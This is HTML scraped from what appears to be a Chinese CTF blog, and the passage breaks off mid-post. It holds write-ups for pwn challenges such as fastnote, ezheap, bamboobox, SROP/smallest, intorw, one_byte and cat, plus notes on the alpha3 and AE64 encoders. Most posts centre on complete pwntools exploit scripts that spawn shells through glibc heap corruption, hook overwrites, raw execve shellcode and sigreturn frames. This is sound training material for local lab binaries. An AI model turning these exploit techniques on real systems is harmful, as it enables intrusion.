	p.sendline(b&amp;quot;2&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))

#gdb.attach(p)
for i in range (0,8):
	add(i,0x90)
add(8,0x20)
for i in range (0,8):
	dele(i)
show(7)
libc_base = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 0x7f4d259cebe0 + 0x7f4d25843c90 - 0x61C90
__free_hook = libc_base + libc.sym[&amp;quot;__free_hook&amp;quot;]
system_addr = libc_base + libc.sym[&amp;quot;system&amp;quot;]

add(9, 0x20)
add(10, 0x20)
dele(8)
dele(9)
edit(10, b&amp;quot;/bin/sh\x00&amp;quot;)
edit(9, p64(__free_hook))
pause()
add(11, 0x20)
add(12, 0x20)
edit(12, p64(system_addr))
dele(10)

p.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;fastnote&#34;&gt;fastnote&lt;/h1&gt;
&lt;p&gt;2.31的libc，double free + tcache&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
p = process(&#39;./vuln&#39;)
libc = ELF(&#39;./libc-2.31.so&#39;)
def add(idx,size,content):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(b&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;Size: &amp;quot;)
	p.sendline(str(size))
	p.recvuntil(&amp;quot;Content: &amp;quot;)
	p.sendline(content)

def show(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(b&amp;quot;2&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
	
def dele(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(b&amp;quot;3&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
	
#gdb.attach(p)
for i in range (0,8):
	add(i,0x80,&#39;a&#39;)
add(8,0x20,&#39;a&#39;)
for i in range (0,8):
	dele(i)
show(7)
libc_base = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 0x7f4d259cebe0 + 0x7f4d25843c90 - 0x61C90
__free_hook = libc_base + libc.sym[&amp;quot;__free_hook&amp;quot;]
system_addr = libc_base + libc.sym[&amp;quot;system&amp;quot;]
print(hex(libc_base))
for i in range (0,10):
	add(i,0x20,&#39;a&#39;)
add(10,0x20,&#39;a&#39;)
for i in range (0,8):
	dele(i)
dele(8)
dele(9)
dele(8)
for i in range (0,7):
	add(i,0x20,&#39;/bin/sh&#39;)
add(7,0x20,p64(__free_hook))
add(8,0x20,p64(__free_hook))
add(9,0x20,p64(system_addr))
add(10,0x20,p64(system_addr))
dele(6)
#pause()

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">hgame2024(week2)</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/alpha3-he-ae64-shi-yong/"" data-c="
          &lt;h1 id=&#34;alpha3&#34;&gt;alpha3&lt;/h1&gt;
&lt;p&gt;1.生成shellcode&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context.arch=&#39;amd64&#39;
sc = shellcraft.sh()
print asm(sc)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2.将上述代码保存成sc.py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python sc.py &amp;gt; shellcode
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;3.使用&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python2 ./ALPHA3.py x64 ascii mixedcase rax --input=&amp;quot;shellcode&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我这里只能用python2，不然说我缺少一些库？？？？&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;x86 ascii uppercase (数字+大写字母)

x86 ascii lowercase (数字+小写字母)

x86 ascii mixedcase (数字+大小写字母)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;Valid base address examples for each encoder, ordered by encoder settings,
are:

[x64 ascii mixedcase]
  AscMix (r64)              RAX RCX RDX RBX RSP RBP RSI RDI

[x86 ascii lowercase]
  AscLow 0x30 (rm32)        ECX EDX EBX

[x86 ascii mixedcase]
  AscMix 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]
                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI] [ESP-4]
                            ECX+2 ESI+4 ESI+8
  AscMix 0x30 (i32)         (address)
  AscMix Countslide (rm32)  countslide:EAX+offset~uncertainty
                            countslide:EBX+offset~uncertainty
                            countslide:ECX+offset~uncertainty
                            countslide:EDX+offset~uncertainty
                            countslide:ESI+offset~uncertainty
                            countslide:EDI+offset~uncertainty
  AscMix Countslide (i32)   countslide:address~uncertainty
  AscMix SEH GetPC (XPsp3)  seh_getpc_xpsp3

[x86 ascii uppercase]
  AscUpp 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]
                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]

[x86 latin-1 mixedcase]
  Latin1Mix CALL GetPC      call

[x86 utf-16 uppercase]
  UniUpper 0x10 (rm32)      EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]
                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;ae64&#34;&gt;AE64&lt;/h1&gt;
&lt;p&gt;使用&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from ae64 import AE64

context.log_level = &#39;debug&#39;
context.arch = &#39;amd64&#39;

p = process(&#39;./example1&#39;)

obj = AE64()
sc = obj.encode(asm(shellcraft.sh()),&#39;r13&#39;)

p.sendline(sc)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">alpha3和AE64使用</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/hgame2024week-1-ezfmt-string/"" data-c="
          &lt;p&gt;这道题要注意本地gdb调试第十八个参数可能啥都没有，但是用python附加调试的时候就蹦出来个三连😇&lt;br&gt;
学习脚本如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;)

#io=remote(&amp;quot;47.100.137.175&amp;quot;,31992)
io=process(&amp;quot;./vuln&amp;quot;)

#gdb.attach(io)
# pause()

backdoor=0x401245

io.recvuntil(b&amp;quot;?\n&amp;quot;)

payload=&amp;quot;%{}c%{}$hn&amp;quot;.format((backdoor)&amp;amp;0xffff,18).encode()
payload=payload.ljust(0x40,b&amp;quot;\x00&amp;quot;)+b&amp;quot;\xc8&amp;quot;
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">hgame2024(week 1) ezfmt string</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/ezheap/"" data-c="
          &lt;p&gt;查看保护（libc版本为2.27）&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708954216740.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
保护全开,虽然有itemlist，存在chunk的地址，但是开了PIE，无法直接使用unlink进行数据修改，并且程序不存在后门函数，但是开了一块可写可执行的地址块，并且运行时会将该地址打印出来，所以主要攻击思路&lt;strong&gt;就是把shellcode写入此地址，然后可以通过劫持malloc_hook函数执行shellcode拿到shell&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;alloc函数&#34;&gt;alloc函数&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1709285505525.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;del函数&#34;&gt;del函数&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1709285410846.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;fill读取函数&#34;&gt;fill读取函数&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1709285449379.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现存在off by NULL漏洞&lt;/p&gt;
&lt;h1 id=&#34;主要思路&#34;&gt;主要思路&lt;/h1&gt;
&lt;p&gt;程序中存在编辑函数，需要借助它写入shellcode和劫持malloc_hook函数，那么则需要在可写可执行的地址块和malloc_hook地址处创造fake chunk，由于存在off by NULL漏洞，所以可以通过freed chunk合并实现freed chunk的fd和bk指针修改，从而之后可以把chunk分配到目标地址实现修改，unsorted bins第一次申请时，fd和bk会指向&amp;lt;main_arena + 96&amp;gt;处（64位），而&amp;lt;main_arena + 96&amp;gt;只与malloc_hook函数相差一个字节&lt;/p&gt;
&lt;h1 id=&#34;向后合并流程&#34;&gt;向后合并流程&lt;/h1&gt;
&lt;p&gt;1.检查p指向chunk的size字段的pre_inuse位，是否为0（也就是检查当前chunk的前一块chunk是否是free的，如果是则进入向前合并的流程)&lt;br&gt;
2.获取前一块chunk的size，并加到size中（以此来表示size大小上已经合并）&lt;br&gt;
3.根据当前chunk的presize来获得指向前一块chunk的指针&lt;br&gt;
4.将这个指针传入unlink的宏（也就是让free掉的chunk的前一块chunk进入到unlink流程）&lt;/p&gt;
&lt;h1 id=&#34;exp如下&#34;&gt;exp如下&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
p = process(&#39;./ezheap&#39;)

def add(size):
	p.sendlineafter(&amp;quot;&amp;gt;&amp;gt; &amp;quot;, &amp;quot;1&amp;quot;)
	p.sendlineafter(&amp;quot;Size: &amp;quot;, str(size))
	p.recvuntil(&#39;0x&#39;)
	return int(p.recv(12),16)
    	
def dele(idx):
	p.sendlineafter(&amp;quot;&amp;gt;&amp;gt; &amp;quot;, &amp;quot;2&amp;quot;)
	p.sendlineafter(&amp;quot;Index: &amp;quot;, str(idx))

def edit(idx, content):
	p.sendlineafter(&amp;quot;&amp;gt;&amp;gt; &amp;quot;, &amp;quot;3&amp;quot;)
	p.sendlineafter(&amp;quot;Index: &amp;quot;, str(idx))
	p.sendlineafter(&amp;quot;Content: &amp;quot;, content)

p.recvuntil(&#39;0x&#39;)
mmap_addr = int(p.recv(10),16)
#gdb.attach(p)
add(0x410)  #大小在unsorted bin内，为后续unlink做准备(bk需要是0x4f0的chunk的地址)
add(0x18)   
add(0x28)   
add(0x4f0)  #size=0x500，可利用off by NULL将标志位置0，实现chunk覆盖
add(0x10)   #防止与top chunk合并
dele(0)     #为后续unlink做准备
edit(2,p64(0)*4+p64(0x470)) #实现chunk合并
dele(3) #实现chunk合并
dele(1) 
dele(2) #将其置入tcache bin中
add(0x430) 
add(0x520)
edit(0,b&#39;a&#39;*0x410+p64(0)+p64(0x20)+p64(mmap_addr))
edit(1,&amp;quot;\x30&amp;quot;)
add(0x18)
add(0x18)   #修改fd为shellcode地址
shellcode = b&amp;quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;quot; #有现成的0x18字节之内的shellcode
edit(3,shellcode)
add(0x28)
add(0x28)
edit(6,p64(mmap_addr))  #修改fd为malloc_hook地址

p.sendlineafter(&amp;quot;&amp;gt;&amp;gt; &amp;quot;, b&amp;quot;1&amp;quot;)
p.sendlineafter(&amp;quot;Size: &amp;quot;,b&amp;quot;0&amp;quot;)

p.interactive()

&lt;/code&gt;&lt;/pre&gt;
">ezheap</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/smash/"" data-c="
          &lt;p&gt;查看保护&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708948704186.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现开了canary保护，并且无法修改got表，嗯.......没啥可说的，就是普通的smash........&lt;img src=&#34;https://l1u66.github.io//post-images/1708949414464.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&#39;./smash2.23&#39;)

flag = 0x404060

payload = b&#39;a&#39;*504 + p64(flag)
p.sendlineafter(&amp;quot;\n&amp;quot;,payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708949496610.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">smash</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/intorwjing-dian-orw/"" data-c="
          &lt;p&gt;查看保护&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708944892857.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现无法修改got表&lt;br&gt;
查看函数权限&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708944975027.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
可以打orw，先用-1绕过长度检验，然后发现程序中自带flag字符串，并且没有pop rdx的ROP，所以利用csu向rdx传入参数，后面就是直接打orw&lt;br&gt;
exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&#39;./intorw&#39;)
elf = ELF(&#39;./intorw&#39;)
rdi = 0x400ad3
rsi_r15 = 0x400ad1
puts_got = 0x600FC0
puts_plt = 0x400760
vuln = 0x4009C4
flag = 0x601046
bss = 0x6010E0

p.sendlineafter(&amp;quot;read\n&amp;quot;,b&#39;-1&#39;)

#gdb.attach(p)

payload = b&#39;a&#39;*40 + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)
p.sendline(payload)

puts = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(&amp;quot;puts = &amp;quot;,hex(puts))
base = puts - 0x80E50
open_ = base + 0x1144E0
read_plt = 0x400790
#pause()
p.sendlineafter(&amp;quot;read\n&amp;quot;,b&#39;-1&#39;)


read_got = 0x600FD8
mov_addr = 0x400ab0
pop_addr = 0x400aca

payload = b&#39;a&#39;*40 + p64(rdi) + p64(flag) + p64(rsi_r15) + p64(0) + p64(0) + p64(open_)
payload += p64(pop_addr) + p64(0) + p64(1) + p64(read_got) + p64(0x3) + p64(bss) + p64(0x30) + p64(mov_addr)+ p64(0)*7
payload += p64(rdi) + p64(bss) + p64(puts_plt)
p.sendline(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下&lt;img src=&#34;https://l1u66.github.io//post-images/1708948528560.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">intorw（经典orw）</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/bamboobox/"" data-c="
          &lt;p&gt;查看保护&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708591140474.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;add_item&#34;&gt;add_item&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708591174637.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
大致就是有个itemlist存放着每一item的大小，item存着内容&lt;/p&gt;
&lt;h1 id=&#34;change_item&#34;&gt;change_item&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708591202345.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现修改内容时对输入长度没有检查，可以产生堆溢出&lt;/p&gt;
&lt;h1 id=&#34;show_item&#34;&gt;show_item&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708591225947.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;remove_item&#34;&gt;remove_item&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708591249649.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现free后置0，没有UAF&lt;/p&gt;
&lt;h1 id=&#34;攻击思路&#34;&gt;攻击思路：&lt;/h1&gt;
&lt;p&gt;1.伪造一个freed chunk&lt;br&gt;
2.通过 unlink 把 chunk 移到存储 chunk 指针的内存处&lt;br&gt;
3.覆盖 chunk 0 指针为 atoi 的 got 表地址并泄露得到libc基地址&lt;br&gt;
4.将atoi函数或（free函数）的实际地址改为system函数的地址&lt;br&gt;
5.传入/bin/sh，调用 atoi 函数得到shell（创建一个/bin/sh的chunk并free）&lt;br&gt;
exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&#39;./bamboobox&#39;)
libc = ELF(&#39;./libc-2.23.so&#39;)
 
def add(length,name):
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(b&#39;2&#39;)
	p.recvuntil(b&#39;:&#39;)
	p.sendline(str(length))
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(name)
 
def change(idx,length,name):
	p.recvuntil(b&#39;:&#39;)
	p.sendline(b&#39;3&#39;)
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(str(length))
	p.recvuntil(b&#39;:&#39;)
	p.sendline(name)
 
def remove(idx):
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(b&amp;quot;4&amp;quot;)
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(str(idx))
 
def show():
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(b&amp;quot;1&amp;quot;)

#gdb.attach(p)
add(0x40,b&#39;a&#39; * 8)
add(0x80,b&#39;b&#39; * 8)
add(0x80,b&#39;c&#39; * 8)  #防止与top_chunk合并
 
itemlist = 0x6020c8

#构造虚假的chunk
payload = p64(0)
payload += p64(0x41)
payload += p64(itemlist - 0x18)              #绕过对unlink的保护
payload += p64(itemlist - 0x10)              #绕过对unlink的保护
payload += b&#39;c&#39;*0x20
payload += p64(0x40)
payload += p64(0x90)
change(0,0x80,payload)
 
remove(1)
payload = p64(0) * 2
payload += p64(0x40) + p64(0x602068)  
change(0,0x80,payload)                               #修改itrmlist[0]
 
show()
p.recvuntil(b&amp;quot;: &amp;quot;)
atoi = u64(p.recvuntil(&amp;quot;:&amp;quot;)[:6].ljust(8,b&#39;\x00&#39;))
base = atoi - libc.symbols[&#39;atoi&#39;]
print(&amp;quot;base = &amp;quot;,base)
sys = base + libc.symbols[&#39;system&#39;]
 
change(0,0x8,p64(sys))                     #将atoi修改为system
 
p.recvuntil(b&amp;quot;:&amp;quot;)
p.sendline(b&amp;quot;/bin/sh\x00&amp;quot;)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">bamboobox（unlink）</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/srop/"" data-c="
          &lt;h1 id=&#34;pwn&#34;&gt;pwn&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708576880109.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
主要逻辑&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708577115158.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现溢出非常多，并且读入后write函数也过多读取，可以借此泄露栈地址&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708579972036.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现给出了&lt;code&gt;mov  rax,0fh&lt;/code&gt;gadgets，0xf刚好是64位sigreturn函数的系统调号，如果要打srop需要知道/bin/sh字符串的地址，但是输入地址在栈上，并且程序中不含/bin/sh字符串，所以需要自己构造并计算偏移（第二次输入/bin/sh字符串，计算泄露的栈地址和字符串的偏移，这里计算的是0x148），&lt;/p&gt;
&lt;h2 id=&#34;攻击思路&#34;&gt;攻击思路：&lt;/h2&gt;
&lt;p&gt;1.借用第一次栈溢出泄露栈地址&lt;br&gt;
2.构造sigframe得到shell&lt;br&gt;
exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./pwn&amp;quot;)
elf = ELF(&amp;quot;./pwn&amp;quot;)
vuln = 0x4004ED
mov_rax_0xf = 0x4004DA
syscall = 0x400517

#gdb.attach(p)

payload = b&#39;a&#39;*16 + p64(vuln)
p.send(payload)
stack = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(stack))
sh = stack - 328

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = sh
sigframe.rsi = 0
sigframe.rsp = stack
sigframe.rdx = 0
sigframe.rip = syscall

payload = b&amp;quot;/bin/sh\x00&amp;quot; + p64(0) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe)
p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;smallest&#34;&gt;smallest&lt;/h1&gt;
&lt;p&gt;这题........好叼.......大开眼界了属于是😥&lt;br&gt;
查看保护发现只开了NX保护，打开程序一看&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708586883469.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现只有这几行汇编代码，果然是smallest，发现程序直接在rsp写入，然后直接ret，也没有什么有用的gadgets，巧妙的是&lt;br&gt;
1.先发送三个main函数地址，然后利用read函数返回地址就是写入的字节数，将main函数的最后一位改掉，使rax没有置0，还保持1，随后调用syscall则会调用write函数，泄露出栈地址😱&lt;br&gt;
2.然后调用read函数把rsp迁移到泄露的栈地址上（/bin/sh的地址可确定）（如果要将字符串放到rsp附近会妨碍函数调用）（也有想过直接调用execve函数但是动态调试发现泄露的栈地址和字符串之间的偏移量在变化）&lt;br&gt;
3.调用execve函数得到shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./smallest&amp;quot;)
elf = ELF(&amp;quot;./smallest&amp;quot;)
ret = 0x4000c0
syscall_ret = 0x4000be
main = 0x4000b0

gdb.attach(p)
pause()
payload = p64(main)*3
p.send(payload)
sleep(5)
p.send(b&#39;\xb3&#39;)
stack = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(stack))

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack
sigframe.rsp = stack
sigframe.rdx = 0x400
sigframe.rip = syscall_ret
payload = p64(main) + p64(0) + bytes(sigframe)  #p64(0)将会被后面的syscall_ret地址覆盖
p.send(payload)

sleep(5)
#pause()

payload = p64(syscall_ret) + b&amp;quot;\x00&amp;quot;*7   #一方面是0xf字节调用sigreturn函数，一方面用\x00覆盖防止修改sigframe
p.send(payload)

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack + 0x200
sigframe.rsp = stack
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rip = syscall_ret

payload = p64(main) + p64(0) + bytes(sigframe)
payload = payload.ljust(0x200,b&amp;quot;\x00&amp;quot;) + b&amp;quot;/bin/sh\x00&amp;quot;
p.send(payload)

sleep(5)
#pause()

payload = p64(syscall_ret) + b&amp;quot;\x00&amp;quot;*7
p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">SROP</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/beginctfbu-fen-wp/"" data-c="
          &lt;h1 id=&#34;one_byte&#34;&gt;one_byte&lt;/h1&gt;
&lt;p&gt;查看程序逻辑&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708506835403.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现程序打开了flag文件并可以输出一个字母，后面的read出现了溢出，只能覆盖rbp和返回地址的一个字节&lt;br&gt;
看看栈&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708507601401.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现返回到__libc_start_call_main+122，由于只能改一个字节，所以看看__libc_start_call_main函数&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708507095606.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
易知&lt;code&gt;0x7ffff7df16c8 &amp;lt;__libc_start_call_main+120&amp;gt;: call   rax&lt;/code&gt;调用了main（因为返回地址是__libc_start_call_main+122），发现&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708507454576.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
在ret后正好[rsp + 0x8]是main函数地址，所以把返回地址改为0x7ffff7df16c3，覆盖0xc3即可&lt;br&gt;
exp如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./one_byte&amp;quot;)
elf = ELF(&amp;quot;./one_byte&amp;quot;)

flag = &amp;quot;&amp;quot;
for i in range(100):
    p.recvuntil(b&#39;: &#39;)
    flag += p.recv(1).decode()
    p.sendafter(b&#39;?\n&#39;, b&#39;a&#39;*0x11 + b&#39;\xc3&#39;)

print(flag)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功打印出创建的flag&lt;/p&gt;
&lt;h1 id=&#34;cat&#34;&gt;cat&lt;/h1&gt;
&lt;p&gt;查看保护&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708508957098.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
查看逻辑&lt;br&gt;
先是在bss段有两次read，然后作为参数来到（存在后门函数）&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708509030750.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
存在栈溢出，但是开了canary保护，设法绕过，程序本身不存在输出函数，不好将canary泄露，发现存在strcat函数，会将字符串结尾的\x00删去并拼接字符串，canary低地址处以\x00结尾，将canary的\x00覆盖掉，那么strcat函数便会从rbp高地址的\x00开始拼接，如图&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708511802739.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
借此可以通过strcat函数实现绕过canary向ret地址写入&lt;br&gt;
exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./cat&amp;quot;)
elf = ELF(&amp;quot;./cat&amp;quot;)
sys = 0x4011F6

#gdb.attach(p)

p.sendafter(&amp;quot;\n&amp;quot;,b&amp;quot;bb&amp;quot;+b&amp;quot;\xFE\x11\x40&amp;quot;)
p.sendafter(&amp;quot;\n&amp;quot;,24*b&amp;quot;c&amp;quot;+b&amp;quot;\x00&amp;quot;)

payload = b&#39;a&#39;*57
p.sendafter(&amp;quot;\n&amp;quot;,payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功打印出创建的flag(可能一次不通，是因为canary中可能存在其他的\x00)&lt;/p&gt;
&lt;h1 id=&#34;gift_rop&#34;&gt;gift_rop&lt;/h1&gt;
